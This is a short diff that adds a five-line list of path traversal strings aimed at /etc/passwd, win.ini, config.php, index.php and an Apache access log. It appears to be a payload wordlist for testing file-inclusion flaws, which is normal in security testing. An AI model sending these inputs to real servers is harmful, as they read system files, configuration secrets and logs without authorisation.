@@ -1,0 +1,5 @@
+../../../../etc/passwd
+../../../../windows/win.ini
+../config.php
+../index.php
+../../../../var/log/apache2/access.log
